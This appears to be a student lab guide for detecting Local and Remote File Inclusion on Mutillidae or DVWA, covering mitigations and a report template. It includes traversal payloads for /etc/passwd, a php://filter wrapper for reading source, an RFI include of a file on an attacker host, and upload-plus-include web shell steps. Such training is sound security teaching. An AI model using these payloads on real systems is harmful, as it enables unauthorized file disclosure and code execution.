# EXPT-09-File-Inclusion-(LFI-RFI)-Vulnerabilities.md

_(Copy this whole file into your repo as `EXPT-09-File-Inclusion-(LFI-RFI)-Vulnerabilities.md`. — **Note:** this file **does not** include Mutillidae install steps — it assumes Mutillidae (or DVWA or equivalent lab app) is already installed and reachable at `http://localhost/...`.)_

---

# Experiment 9 — File Inclusion Vulnerabilities (LFI & RFI)

**Platform:** Kali Linux + Mutillidae (or DVWA) + Burp Suite + local web resources
**Purpose (one-liner):** detect and demonstrate Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities on an authorized lab target, capture safe evidence for your practical, and state practical mitigations.
**Safety & ethics:** Only perform these tests on authorized lab targets (Mutillidae / DVWA / teacher VM). Some payloads can read sensitive files or lead to code execution — **do not** run anything on systems you don’t own or have explicit permission to test. Document scope & time clearly.

---

## Contents

1. Short theory — what LFI and RFI are (exam-ready)
2. Prerequisites (software + lab)
3. Quick checklist (one-page)
4. Step-by-step — detect LFI (safe, non-destructive)
5. Step-by-step — RFI (safe lab-only PoC)
6. Advanced (optional) — viewing protected files via PHP wrappers (lab-only)
7. Upload + include (web shell) — **ONLY** if instructor permits; otherwise skip
8. Fallback: DVWA / alternative labs if Mutillidae fails
9. Useful payloads & encoding tips (safe, exam-friendly)
10. What to capture & sample evidence filenames (for `evidence/`)
11. Mitigations / exact phrasing for viva
12. Minimal lab report template (copy-paste)
13. Appendix — commands, Burp tips & quick checklist

---

## 1) Short theory (2–3 sentences you can say to teacher)

**Local File Inclusion (LFI)** occurs when an application improperly includes filesystem paths provided by users (for example `include($_GET['page'])`), allowing an attacker to read local files (like `/etc/passwd`) or sometimes escalate to code execution. **Remote File Inclusion (RFI)** happens when the application allows including remote URLs (e.g., `http://attacker/shell.php`), which can lead to remote code execution — modern servers should disable `allow_url_include`. Both are serious; LFI primarily exposes sensitive local files, RFI can allow executing attacker-controlled code on the server.

---

## 2) Prerequisites

- Kali Linux (updated).
- Mutillidae (or DVWA/another lab app) installed and reachable (e.g., `http://localhost/mutillidae/`).
- Burp Suite (Community or Pro) configured as proxy and Burp CA imported.
- Small workspace `~/expt09/` and `~/expt09/evidence/` to store outputs and screenshots.
- Basic familiarity with PHP include patterns and HTTP requests.

---

## 3) Quick checklist (one-page before starting exam)

- [ ] Confirm target & authorization in writing.
- [ ] Start Apache / MySQL if required: `sudo systemctl start apache2` `sudo systemctl start mariadb`.
- [ ] Open target page in proxied browser and identify parameters that look like file includes (e.g., `?page=home.php`, `?file=about`).
- [ ] Capture a baseline request in Burp (Proxy → HTTP history → Save item).
- [ ] Test LFI using directory traversal payloads (small tests only). Save request + response.
- [ ] If RFI is possible in lab (and allowed), host a small remote file on attacker host and demonstrate include (lab-only). Otherwise note the server setting (`allow_url_include`) prevents RFI.
- [ ] Save evidence, screenshots, and `finding_summary.md`.

---

## 4) Step-by-step — Detecting LFI (safe, non-destructive)

### A. Identify candidate parameter

1. Browse the app and look for pages that include other pages based on a `GET` parameter, e.g.:

   ```
   http://localhost/mutillidae/index.php?page=home.php
   ```

   or

   ```
   http://localhost/mutillidae/?file=contact
   ```

2. Capture the request in Burp Proxy → HTTP history. Right-click → **Save item** (for later reference).

### B. Test directory traversal to read a harmless file

> Start with non-sensitive, local-readable files if available (app logs or `/proc/self/environ` only on lab). A common quick test is to attempt reading `/etc/passwd` — in a lab that’s acceptable but mention in report this is sensitive info and done only for demonstration.

**Payload examples (safe, small):**

- `?page=../../../../etc/passwd`
- URL-encoded: `?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd`

**Procedure**

1. In browser or Burp Repeater, replace the parameter with `../../../../etc/passwd` and click **Go**.
2. Observe the response: if contents of `/etc/passwd` appear (lines with `root:x:0:0:...`), LFI is confirmed.
3. Save the raw request/response: `evidence/01_lfi_request.txt` and `evidence/02_lfi_passwd.png` (screenshot showing file content).

**Notes**

- Some servers block direct reads but may reveal error messages or partial content — save that as evidence.
- Try alternative path depths if 4 `../` not enough (varies by app location).

---

## 5) Step-by-step — RFI (lab-only PoC, only if server permits)

**Important:** Many modern PHP installations disable `allow_url_include` (recommended). Only attempt RFI in your lab environment and only if instructor permits. RFI can lead to remote code execution.

### A. Host a benign remote file on attacker machine

1. Create a simple PHP file on your Kali machine `~/expt09/attacker_shell.php` containing a benign marker — e.g.:

```php
<?php
echo "RFI-POC-OK";
?>
```

2. Serve it using a simple HTTP server that supports PHP (or use a small LAMP site you control). For demonstration, you can place `attacker_shell.php` into a local webroot and access via `http://<your-ip>:8000/attacker_shell.php` (ensure PHP is processed — simplest is to host on the target VM or use a simple server with PHP enabled).

_(If you cannot run PHP server, for lab demonstration you can host a plain text file and show that its contents are included — explain limitation in report.)_

### B. Attempt include of remote URL

1. In the vulnerable parameter, supply the remote URL:

   ```
   ?page=http://<attacker-ip>:8000/attacker_shell.php
   ```

2. If `allow_url_include` is enabled and the server includes remote files, the response will include `RFI-POC-OK`. Capture the request/response as `evidence/03_rfi_request.txt` and screenshot `evidence/04_rfi_response.png`.

### C. If RFI fails

1. Capture server response (403, warning, or no effect) and note config: `allow_url_include` is likely disabled. Save `evidence/05_rfi_failed.txt`.
2. You can also check PHP config if you have access: `phpinfo()` (only on lab VM) and show `allow_url_include = Off`.

**Safety note:** If remote included file contains PHP code, it may be executed on the target. Avoid placing any destructive code in `attacker_shell.php`. Keep it a harmless marker string.

---

## 6) Advanced (optional) — use PHP wrappers to read files (lab-only)

Some PHP wrappers allow reading files in different ways (e.g., `php://filter`), useful for reading source code:

**Example** (only show and use in lab):

- `?page=php://filter/convert.base64-encode/resource=../config.php` — this returns base64 of `config.php` (if accessible). You can decode locally to view contents.

**Procedure (if allowed):**

1. Try the wrapper in Repeater. If output is base64, copy and decode locally:

   ```bash
   echo "<base64_string>" | base64 --decode > config.php
   ```

2. Save evidence and mention in report that wrapper usage requires certain PHP configurations and is lab-only.

**Caveat:** Many installations disable or restrict wrappers. Use only in lab and with permission.

---

## 7) Upload + include (web shell) — **ONLY WITH INSTRUCTOR PERMISSION**

This technique combines a file upload vulnerability (if present) with LFI to include the uploaded file and achieve RCE. This is powerful and destructive if misused — **do not** perform unless explicitly authorized and supervised.

**High-level steps (do not perform unless permitted):**

1. Find an upload feature that accepts files and is not properly restricted. Upload a harmless `.php` file containing a marker only.
2. Locate the saved filename/path (via response or directory listing).
3. Use LFI to include uploaded file (e.g., `?page=uploads/shell.php`). If executed, server runs uploaded PHP. Capture evidence and immediately remove the file.

If instructor allows, they will instruct what to upload and how to clean up. Otherwise **skip** this section and document that you did not perform it for safety.

---

## 8) Fallback: DVWA / alternative labs if Mutillidae fails

- DVWA has pages suitable for LFI testing under the **File Inclusion** module (or via custom vulnerable pages). Enable `low` security and follow the same steps: identify include param, attempt `../` traversal, capture evidence.
- OWASP Juice Shop may not contain LFI but has different labs — use appropriate lab exercises.

---

## 9) Useful payloads & encoding tips (safe, exam-friendly)

**Directory traversal (examples)**

- `?page=../../../../etc/passwd`
- `?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd` (URL-encoded)
- Try different depths if initial attempts fail.

**PHP wrappers (lab-only, optional)**

- `php://filter/convert.base64-encode/resource=../config.php` — returns base64 encoded file contents.

**RFI (lab-only example)**

- `?page=http://<attacker-ip>:8000/attacker_shell.php`

**Notes**

- If the app normalizes paths or blocks `..`, try double-encoding or alternative encodings — but in exam keep attempts minimal and explain additional techniques verbally if asked.

---

## 10) What to capture & sample evidence filenames (put these in `~/expt09/evidence/`)

1. `evidence/01_lfi_request.txt` — saved raw request used to test LFI.
2. `evidence/02_lfi_passwd.png` — screenshot showing `/etc/passwd` or other harmless file contents returned (mask sensitive data if required).
3. `evidence/03_rfi_request.txt` — raw request trying to include remote file (if attempted).
4. `evidence/04_rfi_response.png` — screenshot of remote file contents included in response (if successful).
5. `evidence/05_rfi_failed.txt` — response showing `allow_url_include` disabled (if RFI blocked).
6. `evidence/06_php_wrapper.txt` — output from php://filter attempt (if used).
7. `evidence/07_upload_include_notes.txt` — notes describing why upload+include was not performed (safety) or summary of supervised test.
8. `commands.txt` — terminal commands used (curl, php -S, base64 decode, etc.).
9. `finding_summary.md` — one-page summary (template below).

**How to save:** In Burp right-click request → **Save item**. Use `gnome-screenshot -a` for screenshots.

---

## 11) Mitigations / exact phrasing for viva

Use these concise, exam-ready statements:

- **Never directly include user-supplied paths:** use a strict allow-list (map short names to server-side file paths) and never construct include paths from raw user input.
- **Canonicalize & validate inputs:** resolve paths server-side, remove `../` sequences, and validate against allowed filenames only.
- **Disable remote includes:** set `allow_url_include = Off` in PHP and ensure `allow_url_fopen` is used carefully.
- **Harden file uploads:** validate file types, store uploads outside webroot, set safe permissions, and do not allow execution of uploaded files.
- **Use least privilege for webserver account:** webserver should not have access to sensitive system files.
- **Disable or restrict dangerous wrappers:** avoid exposing `php://filter` usage and restrict functions like `include`, `require` to safe contexts.
- **Log and monitor file access:** detect unusual inclusion patterns and alert on unexpected reads of sensitive files.

---

## 12) Minimal lab report template (copy-paste into `finding_summary.md`)

```
# Finding Summary — EXPT-09 File Inclusion (LFI / RFI)
**Student:** <Your Name>
**Date:** <dd-mm-yyyy>
**Target:** http://localhost/mutillidae/
**Tools:** Kali Linux, Burp Suite, curl, (local PHP server for RFI PoC if used)

## 1) Steps performed
1. Identified candidate include parameter: `?page=` on `/index.php`.
2. Tested LFI via directory traversal (`?page=../../../../etc/passwd`) and captured response (evidence/02_lfi_passwd.png).
3. (Lab-only) Attempted RFI by hosting a benign `attacker_shell.php` and including via `?page=http://<attacker-ip>:8000/attacker_shell.php` — result saved as evidence/03_rfi_request.txt or evidence/05_rfi_failed.txt if blocked.
4. (Optional) Tested PHP wrapper `php://filter` to read source files (evidence/06_php_wrapper.txt).

## 2) Key findings
- [High] LFI confirmed on parameter `page` — reading local files possible (evidence/02_lfi_passwd.png).
- [Info] RFI attempt was blocked by server config (allow_url_include disabled) — evidence/05_rfi_failed.txt (if applicable).

## 3) Remediations
- Implement allow-lists for include parameters; do not use user input directly in include/require.
- Disable remote include (`allow_url_include = Off`) and restrict wrappers.
- Store uploaded files outside the webroot and set safe permissions; regenerate filenames server-side.
- Apply least privilege to webserver account and monitor inclusion patterns.

## 4) Commands run
- curl -I http://localhost/mutillidae/
- (Saved items via Burp)

## 5) Conclusion
Demonstrated an LFI vulnerability in the lab target allowing local file reads. RFI was attempted in a controlled lab setting and blocked (if applicable). Recommended immediate remediation: allow-list mapping of includes, disabling remote includes, and hardening upload handling. Evidence in `evidence/` folder.
```

---

## 13) Appendix — commands, Burp tips & quick checklist

```bash
# workspace
mkdir -p ~/expt09/evidence
cd ~/expt09

# basic header check
curl -I http://localhost/mutillidae/ > commands.txt

# host a simple PHP file (if allowed and PHP is installed on attacker host)
# place attacker_shell.php in /var/www/html/attacker_shell.php and access via http://<attacker-ip>/attacker_shell.php
# or use built-in server if using local test PHP:
php -S 0.0.0.0:8000   # run from folder containing attacker_shell.php

# base64 decode example (if you used php://filter to get base64 output)
echo "BASE64STRING" | base64 --decode > decoded_file.php

# take a screenshot (select area)
gnome-screenshot -a -f ~/expt09/evidence/02_lfi_passwd.png
```

**Burp quick tips**

- Add the target host to **Target → Scope** so your Site map is clean.
- Use **Repeater** for iterative LFI tests (quickly change `page` param).
- Save the raw request/response (right-click → Save item) — Burp’s saved text is good evidence.
- If you need to demonstrate RFI, show `phpinfo()` (only on lab VM) or `php -i` to show `allow_url_include` setting; do not run `phpinfo()` on production servers.

---

### Final exam strategy

1. Show `finding_summary.md` first to examiner (one-minute summary).
2. Present a canonical LFI PoC: saved raw request + screenshot of `/etc/passwd` (or lab-safe file). Explain impact and mitigation.
3. If RFI was demonstrable in lab, show the benign remote file being included and emphasize danger. If RFI blocked, show server config evidence.
4. Keep evidence tidy and never run upload+include (web shell) unless explicitly instructed by your teacher.

---
